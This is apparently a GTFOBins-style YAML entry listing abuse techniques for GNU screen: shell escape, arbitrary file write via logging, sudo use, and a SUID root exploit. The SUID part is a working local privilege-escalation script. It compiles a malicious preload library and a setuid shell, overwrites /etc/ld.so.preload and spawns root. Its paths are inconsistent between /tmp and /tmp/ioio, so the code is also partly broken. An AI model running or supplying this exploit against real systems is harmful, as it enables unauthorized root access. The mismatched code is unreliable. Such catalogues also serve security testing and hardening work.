---
functions:
  shell:
    - code: screen
  file-write:
    - description: This has been found working on screen version 4.06.02. The file has a trailing `^C` character.
      code: |
        LFILE=file_to_write
        screen -L -Logfile $LFILE tail -f /dev/null
        DATA
        ^C
    - description: This has been found working on screen version 4.05.00. The file has a trailing `^C` character.
      code: |
        LFILE=file_to_write
        screen -L $LFILE tail -f /dev/null
        DATA
        ^C
  sudo:
    - code: sudo screen
  SUID:
    - description: base on gnu/screenroot by infodox on 25/1/2017
    - code :|
        cat << EOF > /tmp/libhax.c
        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        __attribute__ ((__constructor__))
        void dropshell(void){
            chown("/tmp/rootshell", 0, 0);
            chmod("/tmp/rootshell", 04755);
            unlink("/etc/ld.so.preload");
            printf("[+] done!\n");
        }
        EOF
        gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
        rm -f /tmp/libhax.c
        cat << EOF > /tmp/rootshell.c
        #include <stdio.h>
        int main(void){
            setuid(0);
            setgid(0);
            seteuid(0);
            setegid(0);
            execvp("/bin/sh", NULL, NULL);
        }
        EOF
        gcc -o /tmp/rootshell /tmp/ioio/rootshell.c
        rm -f /tmp/rootshell.c
        echo "[+] Now we create our /etc/ld.so.preload file..."
        cd /etc
        umask 000 # because
        screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/ioio/libhax.so" # newline needed
        echo "[+] Triggering..."
        screen -ls # screen itself is setuid, so... 
        /tmp/ioio/rootshell
---
